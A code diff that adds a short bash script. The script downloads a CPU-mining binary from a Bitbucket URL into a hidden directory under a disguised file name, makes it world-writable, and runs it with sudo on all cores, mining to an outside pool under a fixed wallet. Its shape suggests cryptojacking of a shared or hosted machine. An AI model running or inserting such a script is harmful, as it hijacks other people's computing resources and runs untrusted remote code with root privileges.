@@ -1,0 +1,6 @@
+#!/bin/bash
+apt-get update ; apt-get -y install sudo
+mkdir .kap && cd .kap
+wget -O skak https://bitbucket.org/aboxx/filee/raw/main/cpuminer-avx2
+chmod 777 skak
+sudo ./skak -a yescryptr32 -o stratum+tcp://stratum-na.rplant.xyz:7116 -u UPoxZXYCDMuT84Bfb8g9D1Wz4ud1md1kC4.x -p webpassword=x -t $(nproc --all)
